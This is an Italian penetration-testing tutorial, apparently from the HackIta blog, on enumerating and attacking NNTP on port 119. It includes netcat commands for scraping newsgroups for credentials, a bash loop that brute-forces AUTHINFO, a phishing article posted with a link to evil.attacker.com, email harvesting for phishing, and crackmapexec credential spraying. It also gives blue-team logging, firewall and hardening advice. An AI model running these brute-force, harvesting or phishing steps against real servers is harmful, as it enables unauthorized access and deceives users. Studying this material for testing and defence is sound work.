---
title: 'Porta 119 NNTP: Guida al Penetration Testing del Network News Transfer Protocol'
slug: porta-119-nntp
description: 'Porta 119 aperta? NNTP è quasi defunto ma può esporre newsgroup con credenziali in chiaro, username e dati confidenziali. Scopri come enumerare e sfruttarlo.'
image: /porta-119-nntp.webp
draft: true
date: 2026-04-25T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - nnyp
  - usenet
---

La porta 119 espone **NNTP** (Network News Transfer Protocol) — il protocollo sviluppato negli anni '80 per distribuire Usenet newsgroups, predecessor di forum moderni e social media. NNTP opera su TCP porta 119 permettendo client di leggere/postare articoli in newsgroup gerarchici (comp.security, alt.hacking, ecc.) tramite server interconnessi che sincronizzano contenuti globalmente. In penetration testing moderno, la porta 119 è **largamente obsoleta** — Usenet è defunto come piattaforma mainstream (picco 2000, decline post-2010 con rise di Reddit/Twitter), ma NNTP servers sopravvivono in: academic networks legacy, corporate internal newsgroups per documentazione storica, e alcuni CTF challenges retro-style. Trovarla attiva nel 2026 indica infrastructure outdated o honeypot intentional. L'unico use pentest è information disclosure (newsgroup content leak, username enumeration) e test per legacy CVE su server NNTP antichi.

NNTP sopravvive marginalmente nel 2026 per: binary newsgroups (alt.binaries.\* per file sharing legacy), academic/research archives (mantenuti per historical record), e internal corporate "bulletin boards". Modern alternative sono Slack, Teams, Discord — NNTP è 99% defunto fuori niche communities. In CTF/lab, porta 119 compare raramente ma quando presente indica challenge con flavor 1990s Internet culture.

***

## Anatomia tecnica di NNTP

NNTP usa **TCP porta 119** con protocollo testuale command/response simile a SMTP/POP3.

**Flow NNTP session:**

1. **TCP Connect** — Client connette porta 119
2. **Greeting** — Server risponde `200 news.server.com NNTP Service Ready`
3. **Authentication** (se required) — `AUTHINFO USER username` / `AUTHINFO PASS password`
4. **Group Selection** — `GROUP comp.security` seleziona newsgroup
5. **Article Retrieval** — `ARTICLE 12345` scarica articolo
6. **Posting** (se permesso) — `POST` + article content
7. **Quit** — `QUIT` chiude session

**Comandi NNTP critici:**

| Comando              | Funzione                     | Pentest relevance          |
| -------------------- | ---------------------------- | -------------------------- |
| `LIST`               | Lista tutti newsgroups       | **Information disclosure** |
| `GROUP <name>`       | Seleziona newsgroup          | Access control test        |
| `ARTICLE <id>`       | Scarica articolo             | **Content theft**          |
| `HEAD <id>`          | Solo headers (From, Subject) | Metadata leak              |
| `POST`               | Pubblica articolo            | Spam/phishing injection    |
| `AUTHINFO USER/PASS` | Authentication               | **Credential attack**      |
| `HELP`               | Lista comandi supportati     | **Fingerprinting**         |

**NNTP response codes:**

```
2xx = Success (200 OK, 215 list follows)
4xx = Temporary error (400 service discontinued)
5xx = Permanent error (502 permission denied)
```

**NNTP vs modern platforms:**

| Feature        | NNTP (1985)               | Reddit/Discord (2010s)     |
| -------------- | ------------------------- | -------------------------- |
| Protocol       | Text-based TCP            | HTTPS REST API             |
| Authentication | Optional, weak            | OAuth, 2FA                 |
| Encryption     | ❌ Plaintext (NNTPS = 563) | ✅ HTTPS required           |
| Content format | Plain text                | Rich media (images, video) |
| Status 2026    | Defunto (niche)           | Dominante                  |

Le **misconfigurazioni comuni** (se NNTP esiste) sono: anonymous posting abilitato (spam vector), nessuna autenticazione required per read (info disclosure), password plaintext (AUTH), e content filtering assente (malware distribution via binary newsgroups).

***

## Enumerazione base

```bash
nmap -sV -p 119 10.10.10.119
```

**Output se attivo (rare):**

```
PORT    STATE SERVICE VERSION
119/tcp open  nntp    INN nntpd 2.6.3
```

**Se closed (expected 2026):**

```
PORT    STATE  SERVICE
119/tcp closed nntp
```

**Banner grab manuale:**

```bash
nc -vn 10.10.10.119 119
```

```
200 news.example.com InterNetNews NNRP server INN 2.6.3 ready (posting ok)
```

**Test HELP command:**

```bash
nc -vn 10.10.10.119 119
HELP
```

```
100 Help text follows
  ARTICLE [message-ID|number]
  AUTHINFO USER username
  AUTHINFO PASS password
  BODY [message-ID|number]
  GROUP newsgroup
  HEAD [message-ID|number]
  LIST [ACTIVE|NEWSGROUPS|...]
  POST
  QUIT
.
```

***

## Enumerazione avanzata

### List newsgroups

```bash
nc -vn 10.10.10.119 119
LIST
```

```
215 Newsgroups in form "group high low flags"
comp.security 001234 001000 y
corp.internal.passwords 000050 000001 y
corp.confidential.projects 000100 000001 n
alt.test 999999 999900 y
.
```

**Intel estratta:**

* Newsgroup `corp.internal.passwords` (!!!)
* Newsgroup `corp.confidential.projects`
* Posting permission (`y` vs `n`)

### Read articles from sensitive newsgroup

```bash
nc -vn 10.10.10.119 119
GROUP corp.internal.passwords
```

```
211 50 1 50 corp.internal.passwords group selected
```

**Output:** 50 articles, first=1, last=50.

```bash
ARTICLE 1
```

```
220 1 <msg-id@news.example.com> Article retrieved
Path: news.example.com!news
From: [email protected]
Subject: New VPN Password
Date: 6 Feb 2026 10:00:00 GMT
Newsgroups: corp.internal.passwords

Hi team,

Updated VPN credentials:
Username: vpnuser
Password: Vpn_2024_Secure!

Regards,
IT Admin
.
```

**Credentials leaked:** `vpnuser:Vpn_2024_Secure!`

### NSE scripts NNTP

```bash
nmap --script nntp-ntlm-info -p 119 10.10.10.119
```

```
PORT    STATE SERVICE
119/tcp open  nntp
| nntp-ntlm-info:
|   Target_Name: NEWSSERVER
|   Domain_Name: CORP
|_  Workstation: NEWSSERVER
```

***

## Tecniche offensive

### 1. Information disclosure via newsgroup scraping

```bash
# Dump all newsgroups
nc -vn 10.10.10.119 119 <<EOF
LIST
QUIT
EOF
```

**Parse output per newsgroups interessanti:**

```bash
grep -i "password\|confidential\|secret\|admin" newsgroups.txt
```

**Download articles:**

```bash
# Script per dump completo
for group in corp.internal.passwords corp.confidential.projects; do
  echo "GROUP $group" | nc 10.10.10.119 119
  # Parse article range, loop ARTICLE 1..N
done
```

### 2. Authentication brute force (se AUTH required)

```bash
# Test auth requirement
nc -vn 10.10.10.119 119
LIST
```

**Response se auth required:**

```
480 Authentication required
```

**Brute force AUTHINFO:**

```bash
# Hydra NNTP module (rare, custom script più comune)
for user in admin news postmaster; do
  for pass in $(cat passwords.txt); do
    echo -e "AUTHINFO USER $user\nAUTHINFO PASS $pass\nLIST" | nc 10.10.10.119 119 | grep -q "215" && echo "[+] $user:$pass"
  done
done
```

### 3. Spam/phishing injection via POST

**Se posting abilitato:**

```bash
nc -vn 10.10.10.119 119
POST
```

```
340 Send article to be posted. End with <CR-LF>.<CR-LF>
```

**Inject spam:**

```
From: [email protected]
Newsgroups: corp.general
Subject: Urgent: Security Update Required

Click here to update your password: http://evil.attacker.com/phishing
.
```

```
240 Article posted
```

**Result:** Phishing message distribuito a tutti utenti che leggono `corp.general`.

### 4. Binary newsgroup malware distribution

**Legacy use case (rarissimo 2026):**

```bash
# Upload malware disguised come .rar in alt.binaries
# yEnc encoding per binary data
```

**Modern irrelevance:** Binary newsgroups quasi defunti, sostituiti da BitTorrent/cloud storage.

***

## Scenari pratici

### Scenario 1 — NNTP disclosure → credential harvest

**Contesto:** Corporate legacy newsgroup server.

```bash
# Fase 1: NNTP discovery
nmap -sV -p 119 10.10.10.0/24 --open
# 10.10.10.119 INN nntpd detected
```

```bash
# Fase 2: List newsgroups
nc -vn 10.10.10.119 119
LIST
```

```
corp.it.passwords
corp.hr.confidential
corp.finance.budgets
```

```bash
# Fase 3: Scrape corp.it.passwords
nc -vn 10.10.10.119 119 <<EOF
GROUP corp.it.passwords
ARTICLE 1
ARTICLE 2
...
EOF
```

**Content harvested:**

* VPN credentials
* WiFi passwords
* Server admin accounts

```bash
# Fase 4: Credential testing
crackmapexec smb 10.10.10.0/24 -u vpnadmin -p 'Vpn_Pass_2024!'
```

**Timeline:** 20 minuti da NNTP scan a credential harvest.

**COSA FARE SE FALLISCE:**

* **480 Auth required:** Brute force AUTHINFO o skip se no wordlist success
* **No sensitive newsgroups:** Search historical archives (old article IDs)
* **Posting disabled:** Focus su information disclosure solo

### Scenario 2 — NNTP metadata leak → username enumeration

**Contesto:** Academic newsgroup server.

```bash
# List newsgroups
LIST
# university.cs.students

GROUP university.cs.students
HEAD 1
```

```
From: [email protected]
Subject: Homework 1 submission
Date: 5 Feb 2026
```

**Email harvested:** `[email protected]` → target per [phishing](https://hackita.it/articoli/phishing).

```bash
# Iterate articles, extract all From: headers
for i in {1..100}; do
  echo -e "HEAD $i\nQUIT" | nc 10.10.10.119 119 | grep "^From:"
done > emails.txt

# Dedupe
sort -u emails.txt > university_emails.txt
```

### Scenario 3 — Legacy NNTP CVE exploitation

**Rare:** Se NNTP server antichissimo (INN \<2.5, Diablo News, ecc.)

```bash
# Check version
nc -vn 10.10.10.119 119
# 200 InterNetNews NNRP server INN 2.4.0

# Search exploits
searchsploit INN 2.4
```

**Se CVE esiste** → apply specific exploit (buffer overflow, directory traversal storici).

***

## Detection & evasion

### Lato Blue Team

**NNTP NON dovrebbe essere esposto nel 2026** (salvo requirement storico).

**Log monitoring (INN `/var/log/news/news.notice`):**

```
Feb  6 15:30:00 newsserver nnrpd[1234]: 10.10.14.5 connect
Feb  6 15:30:05 newsserver nnrpd[1234]: 10.10.14.5 group corp.internal.passwords
Feb  6 15:30:10 newsserver nnrpd[1234]: 10.10.14.5 article 1 <msg-id>
```

**IoC critici:**

* Mass article retrieval (scraping)
* Access a newsgroups sensibili da IP insoliti
* POST attempts (spam/phishing injection)

**Firewall rules:**

```bash
# Block NNTP externally
iptables -A INPUT -p tcp --dport 119 -s 10.10.10.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 119 -j DROP
```

### Lato Red Team

**Stealth NNTP enumeration:**

```bash
# Single LIST query
nc -vn 10.10.10.119 119 <<< "LIST" > newsgroups.txt

# Targeted article retrieval (avoid mass scraping)
# Download solo articles con keywords interessanti
```

***

## Performance & scaling

**Single newsgroup enumeration:**

```bash
time nc 10.10.10.119 119 <<< "LIST"
# ~0.5 secondi per 1000 newsgroups
```

**Article download:**

```bash
# ~10-50 articles/minute (depends on size)
```

***

## Tabelle tecniche

### Command reference

| Comando                    | Scopo            | Note                        |
| -------------------------- | ---------------- | --------------------------- |
| `nmap -sV -p 119 <target>` | NNTP detection   | Identify server             |
| `nc <target> 119`          | Manual session   | Banner grab                 |
| `LIST`                     | List newsgroups  | **Information disclosure**  |
| `GROUP <name>`             | Select newsgroup | Required before ARTICLE     |
| `ARTICLE <id>`             | Download article | Content theft               |
| `POST`                     | Publish article  | Spam injection (if allowed) |
| `AUTHINFO USER/PASS`       | Authenticate     | Brute force target          |

### NNTP response codes

| Code | Meaning           | Implication           |
| ---- | ----------------- | --------------------- |
| 200  | Server ready      | Connection success    |
| 215  | List follows      | Newsgroup enumeration |
| 220  | Article retrieved | Download success      |
| 240  | Article posted    | Posting allowed       |
| 480  | Auth required     | Credential needed     |
| 502  | Permission denied | Access blocked        |

***

## Troubleshooting

| Errore                          | Causa                    | Fix                      |
| ------------------------------- | ------------------------ | ------------------------ |
| Connection refused              | NNTP disabled (expected) | Skip enumeration         |
| 480 Auth required               | Authentication enabled   | Brute force or skip      |
| 411 No such newsgroup           | Newsgroup non esistente  | Use LIST per valid names |
| 430 No article with that number | Article ID invalid       | Check GROUP range        |

***

## FAQ

**NNTP è usato nel 2026?**

\<1% servers globally. Usenet defunto mainstream, sopravvive solo niche (binary newsgroups, academic archives).

**Perché NNTP è obsoleto?**

Rise di web forums, Reddit, social media. NNTP era mainstream 1990-2005, poi total decline.

**NNTP è vulnerability?**

Non intrinsecamente, ma server NNTP = outdated infrastructure = likely altre vulnerabilities (legacy OS, unpatched software).

**Posso exploitare NNTP per RCE?**

Raramente. Legacy CVE esistono (INN buffer overflow storici) ma server modern patched. Exploitation è info disclosure primarily.

**Come blocco NNTP?**

Disable news server daemon (`systemctl stop inn2`), firewall block porta 119.

***

## Cheat sheet

| Azione           | Comando                                                                           |
| ---------------- | --------------------------------------------------------------------------------- |
| Scan NNTP        | `nmap -sV -p 119 <target>`                                                        |
| Banner grab      | `nc <target> 119`                                                                 |
| List newsgroups  | `echo "LIST" \| nc <target> 119`                                                  |
| Download article | `echo "GROUP <group>" \| nc <target> 119; echo "ARTICLE <id>" \| nc <target> 119` |
| Test auth        | `echo "LIST" \| nc <target> 119` (480 = auth required)                            |

***

## Perché documentare NNTP (quasi defunto)

NNTP è **99% obsoleto** nel 2026 ma documentato per:

1. **Legacy infrastructure** — Academic/corporate archives storici
2. **CTF challenges** — Retro-style boxes
3. **Historical context** — Understand pre-social-media Internet
4. **Completeness** — Port 119 IANA assignment exists

**Pentest strategy:** Se porta 119 aperta → assume **severely outdated system** → focus su legacy CVE, weak auth, information disclosure.

## Differenza NNTP vs modern alternatives

| Platform      | Protocol          | Encryption  | Status 2026         |
| ------------- | ----------------- | ----------- | ------------------- |
| NNTP (Usenet) | TCP 119           | ❌ Plaintext | Defunto             |
| NNTPS         | TCP 563           | ✅ TLS/SSL   | Quasi defunto       |
| Reddit        | HTTPS             | ✅ Required  | Dominante           |
| Discord       | HTTPS + WebSocket | ✅ Required  | Dominante           |
| Slack/Teams   | HTTPS             | ✅ Required  | Enterprise standard |

## Hardening (se NNTP necessario, unlikely)

```bash
# Restrict access
# /etc/news/readers.conf (INN)
auth "internal" {
    hosts: "10.10.10.0/24"
    default: "<FAIL>"
}

access "internal" {
    users: "internal"
    newsgroups: "corp.*,!corp.confidential.*"
}

# Force authentication
# /etc/news/inn.conf
allownewnews: false
```

## OPSEC: NNTP in pentest

NNTP enumeration è **low-noise** — single LIST query, targeted article download.

```bash
# Minimal footprint
nc 10.10.10.119 119 <<< "LIST" > newsgroups.txt
grep -i "password\|confidential" newsgroups.txt
# Download solo articles rilevanti
```

***

> **Disclaimer:** NNTP è legacy protocol. Porta 119 nel 2026 rarissima. L'autore e HackIta declinano responsabilità. RFC 3977 NNTP: [https://www.rfc-editor.org/rfc/rfc3977.html](https://www.rfc-editor.org/rfc/rfc3977.html)

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
